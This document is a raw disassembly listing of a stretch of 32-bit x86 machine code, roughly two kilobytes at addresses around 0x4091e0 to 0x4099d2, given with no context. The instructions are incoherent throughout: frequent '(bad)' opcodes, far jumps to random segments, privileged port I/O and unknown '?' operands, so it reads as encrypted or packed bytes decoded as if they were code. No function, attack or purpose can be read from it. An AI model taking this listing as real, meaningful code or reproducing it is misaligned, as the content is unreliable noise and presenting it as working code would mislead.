  4091e0:	sbb    bh,BYTE PTR fs:[edi]
  4091e3:	pop    ds
  4091e4:	(bad)  
  4091e5:	shl    DWORD PTR [ebx],0x97
  4091e8:	call   0x9fec7239
  4091ed:	shl    al,cl
  4091ef:	mov    dl,0x63
  4091f1:	jmp    0x1f07:0xf851e359
  4091f8:	pop    esi
  4091f9:	scas   eax,DWORD PTR es:[edi]
  4091fa:	sub    bl,BYTE PTR [esi+0x6f68fbba]
  409200:	xchg   esi,eax
  409201:	push   edi
  409202:	cmp    ah,BYTE PTR [ebp+0x2c3be847]
  409208:	mov    esp,0xb62719bf
  40920d:	adc    DWORD PTR ds:0xdfb35ad9,ebp
  409213:	xchg   DWORD PTR [ecx-0x7d],edx
  409216:	xor    edx,ebx
  409218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409219:	nop
  40921a:	push   ss
  40921b:	fbstp  TBYTE PTR [ebp-0x23]
  40921e:	ins    DWORD PTR es:[edi],dx
  40921f:	jmp    0xde8253bd
  409224:	shl    BYTE PTR ds:0x8b40f286,0xaf
  40922b:	stos   DWORD PTR es:[edi],eax
  40922c:	out    0x21,al
  40922e:	sbb    edi,ebx
  409230:	fs xor dh,bl
  409233:	rol    BYTE PTR [eax-0x22],cl
  409236:	loope  0x40922b
  409238:	popf   
  409239:	mov    cl,0x2
  40923b:	pop    ecx
  40923c:	jecxz  0x40929a
  40923e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40923f:	(bad)  [edi+0x7753d058]
  409245:	or     DWORD PTR [ebx-0x78],esi
  409248:	inc    edi
  409249:	push   es
  40924a:	pop    ss
  40924b:	and    ah,BYTE PTR [eax+0x721c1260]
  409251:	jb     0x409294
  409253:	les    edi,FWORD PTR [eax+0x788ac2f8]
  409259:	imul   esp,DWORD PTR [ecx+edi*8-0x65d22345],0x197b2c52
  409264:	iret   
  409265:	and    DWORD PTR [edi],esi
  409267:	in     al,0xc4
  409269:	and    eax,0xd2d7245c
  40926e:	js     0x4092b5
  409270:	stc    
  409271:	into   
  409272:	jg     0x4092c6
  409274:	push   eax
  409275:	lock adc bh,BYTE PTR [edi+eax*1+0x55]
  40927a:	out    dx,eax
  40927b:	jp     0x4092bf
  40927d:	repz out 0x77,eax
  409280:	mov    ebp,0x7886c4a2
  409285:	in     eax,0x14
  409287:	or     eax,0xf7e29851
  40928c:	cld    
  40928d:	pop    ecx
  40928e:	popf   
  40928f:	pop    ecx
  409290:	inc    ebx
  409291:	aad    0x9e
  409293:	or     esi,DWORD PTR ss:[ebp-0x1a]
  409297:	shr    BYTE PTR [eax+0x162f73a3],cl
  40929d:	add    al,0x16
  40929f:	sti    
  4092a0:	retf   0x87eb
  4092a3:	daa    
  4092a4:	mov    ds:0xf70aa03e,eax
  4092a9:	sub    BYTE PTR [ecx+eiz*1-0x2a52d9a0],dl
  4092b0:	mov    ch,0x26
  4092b2:	add    BYTE PTR [edx+0x7c9c8978],cl
  4092b8:	sti    
  4092b9:	fild   WORD PTR [edx+0x67643848]
  4092bf:	sbb    eax,0xa075689e
  4092c4:	dec    ebx
  4092c5:	fist   DWORD PTR [edi+ebp*2]
  4092c8:	dec    esp
  4092c9:	dec    ecx
  4092ca:	mov    ebx,0x1a0e91dd
  4092cf:	sbb    DWORD PTR fs:[edi-0x76],esi
  4092d3:	(bad)  [edi+0x23765f1]
  4092d9:	xor    ah,0xe8
  4092dc:	dec    eax
  4092dd:	adc    eax,ecx
  4092df:	adc    edi,DWORD PTR [ecx+0x79]
  4092e2:	sbb    BYTE PTR ds:0xdccfc141,ch
  4092e8:	push   ebp
  4092e9:	dec    ebp
  4092ea:	mov    eax,edi
  4092ec:	or     esp,ecx
  4092ee:	out    0xe2,al
  4092f0:	pop    ebp
  4092f1:	adc    eax,0xe517c8a5
  4092f6:	into   
  4092f7:	and    al,0xb3
  4092f9:	out    0x45,al
  4092fb:	shr    DWORD PTR [edx-0x71],0x5f
  4092ff:	and    eax,0xa9192904
  409304:	dec    ecx
  409305:	xchg   edi,eax
  409306:	out    0x2d,eax
  409308:	(bad)  
  409309:	jle    0x4092b1
  40930b:	xchg   esp,eax
  40930c:	xchg   ecx,eax
  40930d:	xor    DWORD PTR [edx],esi
  40930f:	mov    esp,0xa924142e
  409314:	ins    DWORD PTR es:[edi],dx
  409315:	mov    ah,0x20
  409317:	dec    edi
  409318:	in     al,0x8b
  40931a:	fnsave [edx-0x40]
  40931d:	xchg   ecx,eax
  40931e:	adc    DWORD PTR [edi-0x33d9dd1a],0xffffffcb
  409325:	cmp    DWORD PTR [edx],edi
  409327:	lods   al,BYTE PTR ds:[esi]
  409328:	dec    eax
  409329:	mov    ebp,0xa7b28ffd
  40932e:	xchg   ecx,eax
  40932f:	mov    dl,0x80
  409331:	xor    BYTE PTR [esi-0x46c72e97],ch
  409337:	das    
  409338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409339:	mov    esi,0x58e3a46b
  40933e:	and    eax,0xe5ba51bb
  409343:	sub    ah,cl
  409345:	cdq    
  409346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409347:	mov    bl,0xab
  409349:	add    ebp,DWORD PTR ds:0x1cc4a637
  40934f:	and    al,0x3a
  409351:	jecxz  0x4093c6
  409353:	stc    
  409354:	loope  0x40932c
  409356:	jecxz  0x4093c6
  409358:	pop    ss
  409359:	test   al,0xea
  40935b:	cmp    al,0x74
  40935d:	mov    edx,0x2e084d0a
  409362:	fbstp  TBYTE PTR [esi+ecx*1]
  409365:	mov    WORD PTR [eax],?
  409367:	xchg   DWORD PTR [esi-0x3a],ecx
  40936a:	adc    al,0xc8
  40936c:	gs push 0x39
  40936f:	push   esi
  409370:	jmp    0x8f004c16
  409375:	mov    edi,0xd017bf7e
  40937a:	xor    al,0x21
  40937c:	fwait
  40937d:	xchg   ecx,eax
  40937e:	mov    ch,0x29
  409380:	push   0x25
  409382:	jmp    0x66f5b9b4
  409387:	aad    0xc7
  409389:	xor    ch,ah
  40938b:	push   edx
  40938c:	loopne 0x4093ff
  40938e:	ss clc 
  409390:	inc    edi
  409391:	ret    0xdd96
  409394:	xor    DWORD PTR [edx-0x30cebc89],edi
  40939a:	addr16 xchg ecx,eax
  40939c:	jno    0x40933a
  40939e:	shr    BYTE PTR [ecx-0x55715c3a],1
  4093a4:	add    DWORD PTR [eax+0x1f],esi
  4093a7:	jne    0x409383
  4093a9:	lds    ebx,FWORD PTR [edi-0xbf1944a]
  4093af:	cld    
  4093b0:	fnstcw WORD PTR [ecx+edx*4+0x71]
  4093b4:	js     0x409384
  4093b6:	xor    al,0xe3
  4093b8:	arpl   WORD PTR [ebx-0x411d1b3e],bp
  4093be:	ror    BYTE PTR [ebx+edx*8],cl
  4093c1:	mov    ebx,0x1b3fd5d2
  4093c6:	jae    0x409359
  4093c8:	stc    
  4093c9:	mov    edx,0x5ca3b4b2
  4093ce:	repz cmp ch,cl
  4093d1:	xchg   edi,eax
  4093d2:	xchg   esi,eax
  4093d3:	add    esp,DWORD PTR [ebx-0x41]
  4093d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d7:	into   
  4093d8:	sbb    dh,0xad
  4093db:	sub    eax,0xf8b4e7d9
  4093e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093e1:	or     ch,BYTE PTR [esi]
  4093e3:	inc    edx
  4093e4:	or     esp,ebx
  4093e6:	inc    edi
  4093e7:	je     0x4093f4
  4093e9:	scas   eax,DWORD PTR es:[edi]
  4093ea:	out    dx,eax
  4093eb:	cvtps2pi mm0,QWORD PTR [ecx+edi*4-0x1258fdc5]
  4093f3:	ret    
  4093f4:	jecxz  0x4093fb
  4093f6:	(bad)  
  4093f7:	int    0xae
  4093f9:	mov    al,0x8
  4093fb:	jo     0x409427
  4093fd:	and    BYTE PTR [edx],cl
  4093ff:	mov    edi,0xbae9d880
  409404:	(bad)  
  409405:	xchg   edi,eax
  409406:	xchg   edx,eax
  409407:	in     eax,0xcd
  409409:	adc    DWORD PTR [ebx+eax*2+0x47],0xffffffb4
  40940e:	out    0x34,eax
  409410:	sbb    eax,0xaf0f134
  409415:	mov    esp,gs
  409417:	cmp    al,0xf4
  409419:	xchg   esi,eax
  40941a:	js     0x40946d
  40941c:	test   eax,0xa880c40c
  409421:	ret    
  409422:	pop    esp
  409423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409424:	pop    edx
  409425:	jl     0x40944f
  409427:	sbb    BYTE PTR [ebx+ecx*4+0x7e60d7ee],ch
  40942e:	xor    al,0x73
  409430:	jo     0x409490
  409432:	leave  
  409433:	loope  0x4093f8
  409435:	xor    DWORD PTR [edx-0x1a10622e],ebx
  40943b:	je     0x409422
  40943d:	xchg   esi,eax
  40943e:	push   es
  40943f:	rol    DWORD PTR [ebx+eax*2-0x189868d2],0xe3
  409447:	lods   eax,DWORD PTR ds:[esi]
  409448:	push   0xe67f0d9f
  40944d:	pop    esp
  40944e:	mov    cl,BYTE PTR [ebx]
  409450:	add    eax,0xcf32481d
  409455:	mov    edi,0x8e2458d5
  40945a:	adc    eax,0x9ef9c699
  40945f:	sub    DWORD PTR [edx+0xb7c7d3e],0x50
  409466:	push   esi
  409467:	push   cs
  409468:	pop    eax
  409469:	outs   dx,DWORD PTR ds:[esi]
  40946a:	jae    0x409452
  40946c:	mov    dh,0x1a
  40946e:	shl    DWORD PTR [ecx],cl
  409470:	(bad)  
  409471:	and    BYTE PTR [edx],ch
  409473:	int    0xf7
  409475:	aam    0x69
  409477:	leave  
  409478:	mov    dh,0xda
  40947a:	hlt    
  40947b:	mul    BYTE PTR [edi]
  40947d:	xor    bh,bh
  40947f:	xchg   ebp,eax
  409480:	mov    edx,0x410400eb
  409485:	or     dl,BYTE PTR [esi+esi*8]
  409488:	imul   DWORD PTR [eax-0x7]
  40948b:	scas   eax,DWORD PTR es:[edi]
  40948c:	aam    0x1d
  40948e:	inc    edx
  40948f:	jbe    0x409489
  409491:	mov    ah,0x50
  409493:	mov    cl,0xee
  409495:	sti    
  409496:	lea    ebp,[ebx+0x587bc49d]
  40949c:	(bad)  
  40949d:	daa    
  40949e:	mov    esi,?
  4094a0:	sub    ebp,0x1e
  4094a3:	xchg   ebp,eax
  4094a4:	loopne 0x4094e6
  4094a6:	mov    esi,0x4857b352
  4094ab:	jo     0x4094e8
  4094ad:	stos   BYTE PTR es:[edi],al
  4094ae:	sbb    dl,dl
  4094b0:	push   esp
  4094b1:	jae    0x409521
  4094b3:	scas   eax,DWORD PTR es:[edi]
  4094b4:	arpl   bp,dx
  4094b6:	inc    esi
  4094b7:	cmp    al,BYTE PTR [ecx]
  4094b9:	sub    ch,BYTE PTR [esi+0x3bb23c1b]
  4094bf:	mov    eax,ds:0xda08bdcb
  4094c4:	aaa    
  4094c5:	mov    eax,ds:0x914c2914
  4094ca:	popa   
  4094cb:	jle    0x409492
  4094cd:	cmp    cl,BYTE PTR [edx]
  4094cf:	arpl   bp,bx
  4094d1:	push   cs
  4094d2:	or     DWORD PTR [ebp+0x2c1c0801],0xffffff92
  4094d9:	lock xor dh,BYTE PTR [esi-0x698366a9]
  4094e0:	pushf  
  4094e1:	jecxz  0x409493
  4094e3:	sbb    ebp,DWORD PTR [esi]
  4094e5:	out    0x56,al
  4094e7:	xor    ch,dl
  4094e9:	test   DWORD PTR [edx+0x10],esi
  4094ec:	out    dx,al
  4094ed:	add    al,0xc1
  4094ef:	sti    
  4094f0:	xor    BYTE PTR [esi-0x2b],cl
  4094f3:	out    0x94,al
  4094f5:	inc    edi
  4094f6:	loop   0x40951e
  4094f8:	enter  0xc986,0xa4
  4094fc:	les    edi,FWORD PTR [edx]
  4094fe:	shr    dl,1
  409500:	pop    ebp
  409501:	mov    ecx,DWORD PTR [eax+0x3dfeab99]
  409507:	popa   
  409508:	push   esi
  409509:	aad    0xd1
  40950b:	xor    DWORD PTR [ecx+esi*2-0x34],edi
  40950f:	jmp    DWORD PTR [edi-0x782410ae]
  409515:	stc    
  409516:	int3   
  409517:	and    DWORD PTR [esi],edx
  409519:	sub    eax,0xd942359c
  40951e:	add    bh,al
  409520:	pop    edi
  409521:	mov    esp,eax
  409523:	rol    BYTE PTR [edx+edi*4],cl
  409526:	push   0x3d8c5fc4
  40952b:	inc    eax
  40952c:	int    0x85
  40952e:	cli    
  40952f:	mov    ecx,0xb38a6f5e
  409534:	sbb    DWORD PTR [edi-0x4d],ebp
  409537:	inc    edx
  409538:	pop    es
  409539:	test   DWORD PTR [eax-0x54c201c3],ebx
  40953f:	nop
  409540:	add    al,0x18
  409542:	sbb    al,al
  409544:	push   cs
  409545:	and    BYTE PTR [ebp-0x70],bl
  409548:	xor    ah,dh
  40954a:	and    DWORD PTR [esi+ecx*1],0xffffffe8
  40954e:	loope  0x40952e
  409550:	pop    eax
  409551:	jo     0x40957c
  409553:	test   al,0x27
  409555:	lds    ecx,FWORD PTR [edi+0x2c]
  409558:	and    dl,BYTE PTR [ecx+0x23ea4a7f]
  40955e:	xlat   BYTE PTR ds:[ebx]
  40955f:	cdq    
  409560:	mov    esi,0x6b81525e
  409565:	pop    ss
  409566:	lea    ebx,[edx+edx*2-0x18]
  40956a:	dec    esi
  40956b:	pushf  
  40956c:	sahf   
  40956d:	mov    dh,0xd7
  40956f:	or     edi,DWORD PTR [edi]
  409571:	dec    edx
  409572:	jmp    0xc828:0xb91e69fd
  409579:	loop   0x4095e0
  40957b:	jecxz  0x40957c
  40957d:	loop   0x4095de
  40957f:	dec    edi
  409580:	(bad)  
  409581:	addps  xmm6,XMMWORD PTR [edx]
  409584:	pop    esi
  409585:	iret   
  409586:	(bad)  ds:0x7e039875
  40958c:	nop
  40958d:	and    al,0x5e
  40958f:	lock scas al,BYTE PTR es:[edi]
  409591:	les    edx,FWORD PTR [esi]
  409593:	aam    0xc8
  409595:	sti    
  409596:	stos   DWORD PTR es:[edi],eax
  409597:	jg     0x4095cd
  409599:	stos   DWORD PTR es:[edi],eax
  40959a:	mov    al,ds:0x374ad406
  40959f:	pop    edx
  4095a0:	and    DWORD PTR [esp+ebp*1+0x3ac04fd2],0xd95dc4ca
  4095ab:	ret    0x62a
  4095ae:	pop    es
  4095af:	cmp    bl,BYTE PTR [esi-0x20bbbbf8]
  4095b5:	adc    ah,BYTE PTR ds:0xe3bd35ef
  4095bb:	push   ds
  4095bc:	inc    esp
  4095bd:	adc    DWORD PTR ds:0x66d0074e,eax
  4095c3:	shr    ch,cl
  4095c5:	cld    
  4095c6:	arpl   WORD PTR [ebp-0x2feea3bf],si
  4095cc:	or     ebp,DWORD PTR [edi-0x751cc585]
  4095d2:	jbe    0x40955c
  4095d4:	(bad)  
  4095d6:	dec    eax
  4095d7:	imul   ecx,esp,0x54
  4095da:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4095dc:	mov    ds:0x51a89e89,eax
  4095e1:	mov    BYTE PTR [ebx],0xc5
  4095e4:	mov    bl,0xd9
  4095e6:	push   0xfffffff7
  4095e8:	mov    eax,ss:0x2a32572c
  4095ee:	pop    edi
  4095ef:	add    al,0xfe
  4095f1:	rep ds ins DWORD PTR es:[edi],dx
  4095f4:	mov    esp,0xdce4a9b6
  4095f9:	jnp    0x4095df
  4095fb:	mov    eax,DWORD PTR [di-0xcfd]
  409600:	xchg   edi,eax
  409601:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409603:	aaa    
  409604:	loope  0x409590
  409606:	test   eax,0x2e6b4441
  40960b:	mov    ch,0x85
  40960d:	stc    
  40960e:	mov    cl,0x8e
  409610:	fwait
  409611:	cmp    bl,BYTE PTR [ebx-0x116ff51a]
  409617:	rcr    DWORD PTR [esi],cl
  409619:	popa   
  40961a:	jge    0x409681
  40961c:	cs mov ebx,0xbd75843d
  409622:	or     ah,BYTE PTR [eax]
  409624:	cmp    DWORD PTR [eax+0x7d],edx
  409627:	sub    bh,ch
  409629:	xchg   esi,eax
  40962a:	and    ebx,DWORD PTR [edx]
  40962c:	jmp    0xb2cb:0xaca0bf97
  409633:	jbe    0x40969d
  409635:	(bad)  
  409636:	cs (bad) 
  409638:	ins    BYTE PTR es:[edi],dx
  409639:	addr16 mov dh,0x76
  40963c:	add    DWORD PTR [ebp+eax*8+0x26],edx
  409640:	out    0x35,al
  409642:	xor    ch,BYTE PTR [ebx-0x501f8117]
  409648:	bound  ebx,QWORD PTR [ecx]
  40964a:	mov    ds:0xec45e707,eax
  40964f:	dec    ebx
  409650:	repnz sub ah,dl
  409653:	inc    ebp
  409654:	pop    edi
  409655:	mov    al,0x1b
  409657:	ins    DWORD PTR es:[edi],dx
  409658:	push   cs
  409659:	add    ebx,esp
  40965b:	mov    ebx,0xd219751f
  409660:	jle    0x409650
  409662:	adc    bl,ah
  409664:	(bad)  
  409665:	inc    DWORD PTR [ecx-0xc]
  409668:	icebp  
  409669:	dec    edi
  40966a:	sti    
  40966b:	cmp    eax,0xcfef63af
  409670:	or     al,0x61
  409673:	sbb    eax,0xc8eecee6
  409678:	stos   BYTE PTR es:[edi],al
  409679:	jp     0x4096ba
  40967b:	fcmovu st,st(7)
  40967d:	gs add esi,ebx
  409680:	or     esi,edx
  409682:	dec    ebp
  409683:	mov    eax,ds:0x33793e00
  409688:	loopne 0x409667
  40968a:	mov    ah,0xef
  40968c:	dec    eax
  40968d:	sti    
  40968e:	pop    ebx
  40968f:	adc    BYTE PTR [ebx-0x7dd63983],dl
  409695:	dec    edx
  409696:	ret    0xbfaf
  409699:	mov    esp,0x6c5f570f
  40969e:	push   esp
  40969f:	mov    eax,0x9686923d
  4096a4:	adc    al,0x2c
  4096a6:	jl     0x4096dd
  4096a8:	ret    
  4096a9:	sbb    al,0xbe
  4096ab:	pop    es
  4096ac:	jp     0x40967f
  4096ae:	jg     0x409700
  4096b0:	adc    eax,0xedcab039
  4096b5:	clc    
  4096b6:	(bad)  [eax+0x5aec26ae]
  4096bc:	mov    bl,0x18
  4096be:	xor    esi,ebp
  4096c0:	cmp    al,0x76
  4096c2:	pop    edx
  4096c3:	jbe    0x409687
  4096c5:	mov    DWORD PTR [ebx],edi
  4096c7:	sahf   
  4096c8:	push   cs
  4096c9:	cmp    ecx,edx
  4096cb:	xchg   ebp,eax
  4096cc:	test   DWORD PTR ds:0xefac233e,edi
  4096d2:	jmp    0x4096bd
  4096d4:	sbb    eax,0x98bbfde
  4096d9:	addr16 mov dl,0xaa
  4096dc:	cmp    DWORD PTR [ebp-0x2dd151d7],edx
  4096e2:	mov    dh,0x46
  4096e4:	add    DWORD PTR [ebx-0x537cdb56],esi
  4096ea:	push   edi
  4096eb:	pop    eax
  4096ec:	(bad)  
  4096ed:	(bad)  [ebx+ebx*1+0x371c8698]
  4096f4:	or     al,BYTE PTR [edi]
  4096f6:	test   BYTE PTR [ebx+0x62fbcd30],dh
  4096fc:	lds    esi,FWORD PTR [edi+0x54]
  4096ff:	pop    esp
  409700:	and    DWORD PTR [eax-0x2f],esp
  409703:	jmp    0x981d5a96
  409708:	in     al,0xe3
  40970a:	out    dx,eax
  40970b:	mov    eax,ds:0x29c4fa15
  409710:	fldenv [esi]
  409712:	and    al,0xa
  409714:	cld    
  409715:	aad    0x4e
  409717:	call   0xbf535d22
  40971c:	das    
  40971d:	or     esi,DWORD PTR [eax+0x4b36d05e]
  409723:	arpl   si,di
  409725:	lock dec esi
  409727:	pop    esp
  409728:	mov    dh,0x56
  40972a:	add    BYTE PTR [esi+0x62],bl
  40972d:	fcmovne st,st(4)
  40972f:	pop    ds
  409730:	cmc    
  409731:	inc    esp
  409732:	cmp    al,0xc1
  409734:	xlat   BYTE PTR ds:[ebx]
  409735:	sahf   
  409736:	mov    bl,0x43
  409738:	je     0x4096ea
  40973a:	rol    bl,1
  40973c:	mov    ecx,0x336053ae
  409741:	in     eax,0xda
  409743:	imul   ecx,eax,0x8d29ee9c
  409749:	mov    dl,0x1f
  40974b:	shr    DWORD PTR [ecx+0xd],cl
  40974e:	sbb    cl,dh
  409750:	xchg   DWORD PTR [esi-0x7c],ebx
  409753:	mov    eax,ds:0x2ac712c
  409758:	jle    0x40975a
  40975a:	jp     0x4097b2
  40975c:	dec    eax
  40975d:	mov    edx,0xbbaa5cd3
  409762:	dec    ebp
  409763:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409765:	inc    esi
  409766:	repnz mov cl,0x7e
  409769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40976a:	lahf   
  40976b:	fwait
  40976c:	ja     0x4097af
  40976e:	iret   
  40976f:	ds sub al,0x64
  409772:	inc    ebx
  409773:	or     eax,ebx
  409775:	les    ecx,FWORD PTR [edi-0x71]
  409778:	mov    esi,0xf490372d
  40977d:	outs   dx,DWORD PTR ds:[esi]
  40977e:	cdq    
  40977f:	mov    ds:0xacbd76c9,eax
  409784:	dec    ebx
  409785:	mov    edi,0xe2c42533
  40978a:	and    DWORD PTR [eax],esi
  40978c:	iret   
  40978d:	popf   
  40978e:	jnp    0x409775
  409790:	sbb    DWORD PTR [ecx+0x73fdefb6],edx
  409796:	mov    bl,0x74
  409798:	push   ebp
  409799:	data16 (bad) 
  40979b:	mov    ebp,0x1b8c4f66
  4097a0:	xchg   esp,eax
  4097a1:	pop    ss
  4097a2:	push   ecx
  4097a3:	fimul  DWORD PTR [edx]
  4097a5:	sbb    al,0x0
  4097a7:	mov    BYTE PTR [ebx],ch
  4097a9:	ror    BYTE PTR ds:0xb29b6559,cl
  4097af:	mov    ebp,0x708dee3e
  4097b4:	adc    BYTE PTR [edx+0x3f],al
  4097b7:	ins    BYTE PTR es:[edi],dx
  4097b8:	push   ds
  4097b9:	dec    ebp
  4097ba:	xchg   edx,eax
  4097bb:	push   esp
  4097bc:	and    dl,BYTE PTR [edx-0x13]
  4097bf:	je     0x4097aa
  4097c1:	dec    DWORD PTR [eax+0x1246e0bb]
  4097c7:	gs pop edi
  4097c9:	cmp    al,0x9d
  4097cb:	iret   
  4097cc:	pop    ss
  4097cd:	cmp    ah,cl
  4097cf:	(bad)  
  4097d0:	iret   
  4097d1:	mov    cl,0x29
  4097d3:	inc    esp
  4097d4:	xor    dh,BYTE PTR [esi]
  4097d6:	cmp    al,0xe5
  4097d8:	mov    edx,0xc33778df
  4097dd:	adc    BYTE PTR ds:0x54e9f5e4,ah
  4097e3:	or     ch,BYTE PTR [ebp+0x4c894c03]
  4097e9:	adc    dl,bl
  4097eb:	(bad)  
  4097ed:	add    eax,0xe2c82894
  4097f2:	xchg   ebx,eax
  4097f3:	shl    BYTE PTR [edi-0x73bc6f96],1
  4097f9:	cs mov bl,0x16
  4097fc:	test   DWORD PTR [esi],0x41eae66b
  409802:	adc    esi,DWORD PTR es:[ecx]
  409805:	mov    WORD PTR [ecx-0x2b],fs
  409808:	sbb    BYTE PTR [esi-0x5c],0x9e
  40980c:	mov    bh,al
  40980e:	sbb    al,0xdf
  409810:	dec    edx
  409811:	pop    esp
  409812:	aaa    
  409813:	add    eax,0x2ca87322
  409818:	mov    cl,0xb9
  40981a:	std    
  40981b:	fwait
  40981c:	mov    cl,0x4a
  40981e:	dec    edi
  40981f:	lock scas al,BYTE PTR es:[edi]
  409821:	sti    
  409822:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409824:	out    dx,eax
  409825:	jmp    0x480e:0xed5f89c
  40982c:	mov    bh,0x51
  40982e:	test   DWORD PTR [eax+edi*8+0x3fb27d68],esi
  409835:	adc    WORD PTR [edx+0xe790769],cx
  40983c:	xor    BYTE PTR [edi-0x7170ee44],0x9c
  409843:	pop    esi
  409844:	dec    ecx
  409845:	unpcklps xmm7,XMMWORD PTR [edx+0x6]
  409849:	jg     0x409884
  40984b:	xchg   ecx,eax
  40984c:	mov    ecx,0xd8e9a063
  409851:	mov    ah,0x6e
  409853:	mov    bl,0xed
  409855:	pop    ss
  409856:	pop    ecx
  409857:	jnp    0x409899
  409859:	leave  
  40985a:	mov    ds:0x4ee3bae0,eax
  40985f:	sbb    eax,0xf2f1e02b
  409864:	or     al,0x91
  409866:	int3   
  409867:	ja     0x4098c6
  409869:	push   esi
  40986a:	or     eax,0x736f9c2
  40986f:	pop    ss
  409870:	idiv   DWORD PTR [edi]
  409872:	push   es
  409873:	out    dx,al
  409874:	stos   BYTE PTR es:[edi],al
  409875:	or     eax,ebp
  409877:	lods   eax,DWORD PTR ds:[esi]
  409878:	hlt    
  409879:	dec    esi
  40987a:	pop    esi
  40987b:	push   esi
  40987c:	hlt    
  40987d:	jle    0x4098e0
  40987f:	into   
  409880:	repnz lahf 
  409882:	or     BYTE PTR [edx-0x467eaeda],ah
  409888:	jmp    0x40985f
  40988a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40988b:	mov    ch,0x4f
  40988d:	lahf   
  40988e:	or     DWORD PTR [edx+0x2cc3d9bf],edx
  409894:	out    0xdd,al
  409896:	xor    BYTE PTR [eax-0x26],cl
  409899:	pop    ss
  40989a:	jne    0x409869
  40989c:	pop    ecx
  40989d:	jl     0x409838
  40989f:	mov    DWORD PTR [eax-0x2d],edi
  4098a2:	xor    DWORD PTR [esi],ecx
  4098a4:	scas   eax,DWORD PTR es:[edi]
  4098a5:	sbb    DWORD PTR [esi],esp
  4098a7:	or     ch,BYTE PTR [ebx]
  4098a9:	(bad)  
  4098aa:	imul   esp,DWORD PTR [edi-0x48],0x256efa98
  4098b1:	ret    
  4098b2:	or     BYTE PTR [esi],ch
  4098b4:	call   0xf5f1b2e
  4098b9:	fstp   st(1)
  4098bb:	lea    ebp,[eax-0x1c14ce8a]
  4098c1:	arpl   WORD PTR [edx],di
  4098c3:	fmul   QWORD PTR [ecx]
  4098c5:	adc    BYTE PTR [eax+eax*8+0xe4f8531],ah
  4098cc:	in     al,dx
  4098cd:	push   ebp
  4098ce:	fsub   st,st(5)
  4098d0:	push   0xa49b31d7
  4098d5:	sbb    DWORD PTR [eax+0x7d7b3c0d],ebp
  4098db:	repnz add eax,0x57905f1f
  4098e1:	or     eax,DWORD PTR [ebx+0x1]
  4098e4:	sub    ah,cl
  4098e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098e8:	imul   eax,edi,0x7e3cfe01
  4098ee:	outs   dx,BYTE PTR ds:[esi]
  4098ef:	bnd jge 0x4098e9
  4098f2:	je     0x4098c0
  4098f4:	jmp    0x4098b1
  4098f6:	paddusw mm1,QWORD PTR [edx]
  4098f9:	pop    edx
  4098fa:	popw   ss
  4098fc:	or     ebx,edi
  4098fe:	pop    ds
  4098ff:	mov    edi,0xb43d212a
  409904:	cmp    DWORD PTR [ecx],eax
  409906:	aad    0x2c
  409908:	pop    ebx
  409909:	sub    bl,cl
  40990b:	add    edi,edx
  40990d:	pop    eax
  40990e:	mov    WORD PTR [esi+0x42b08ea3],es
  409914:	test   eax,0xa965ed02
  409919:	gs mov bh,0x98
  40991c:	push   edx
  40991d:	xchg   ebx,eax
  40991e:	pop    ss
  40991f:	stc    
  409920:	sbb    ebx,DWORD PTR [edi+ebx*8+0x3e]
  409924:	sub    BYTE PTR [edx+0xa77f72f],bl
  40992a:	fstp   QWORD PTR [esi]
  40992c:	out    0x6d,eax
  40992e:	dec    ebx
  40992f:	push   0x67
  409931:	pop    es
  409932:	rcr    BYTE PTR [ebp+0xa4884eb],0xd2
  409939:	jecxz  0x409918
  40993b:	cdq    
  40993c:	sbb    DWORD PTR [esi+0x2cc3d540],ebp
  409942:	mov    ebp,DWORD PTR [edi]
  409944:	cs push edi
  409946:	cli    
  409947:	xchg   ebx,eax
  409948:	sbb    DWORD PTR [ebp-0xb],esp
  40994b:	mov    al,dh
  40994d:	xor    DWORD PTR [ebx+0x3be38ca1],esi
  409953:	jo     0x4098ea
  409955:	outs   dx,BYTE PTR ds:[esi]
  409956:	and    eax,0x9b2661c2
  40995b:	(bad)  [edx+0xcd108fc]
  409961:	mov    ebp,0x51cfdfab
  409966:	push   ebx
  409967:	cmp    esp,DWORD PTR [esi+0x59]
  40996a:	inc    ecx
  40996b:	xor    BYTE PTR [edx+0x20],cl
  40996e:	rep stos DWORD PTR es:[edi],eax
  409970:	fstp   TBYTE PTR [ecx+eiz*1-0x49]
  409974:	retf   
  409975:	das    
  409976:	mov    bl,0x19
  409978:	mov    ebx,0xaea14518
  40997d:	rcl    BYTE PTR [esi+0x65],0x9
  409981:	cmc    
  409982:	imul   eax,DWORD PTR [edx-0x66f4f65d],0xffffffc5
  409989:	scas   eax,DWORD PTR es:[edi]
  40998a:	popf   
  40998b:	dec    ebp
  40998c:	popa   
  40998d:	fld    QWORD PTR [ebx]
  40998f:	icebp  
  409990:	popa   
  409991:	add    ebp,DWORD PTR [esi+0x37a6b0c1]
  409997:	cmp    eax,0x256c5d7f
  40999c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40999d:	sbb    DWORD PTR [edx],ebp
  40999f:	pop    edx
  4099a0:	and    eax,DWORD PTR [ebp+0x1c]
  4099a3:	ja     0x4099e5
  4099a5:	popa   
  4099a6:	vaddss xmm1,xmm0,DWORD PTR [eax+0x53]
  4099ab:	pop    edi
  4099ac:	mov    ebp,0x14febfc6
  4099b1:	or     ah,BYTE PTR [ecx+0x7b086c6]
  4099b7:	lods   al,BYTE PTR ds:[esi]
  4099b8:	les    ebx,FWORD PTR [esi-0x4142fa17]
  4099be:	push   edi
  4099bf:	call   0x41d4e862
  4099c4:	mov    bl,0x6
  4099c6:	mov    ds:0x510bb6b1,al
  4099cb:	jmp    0x40998b
  4099cd:	push   ss
  4099ce:	rep stos DWORD PTR es:[edi],eax
  4099d0:	mov    cl,0xea
  4099d2:	dec    ecx
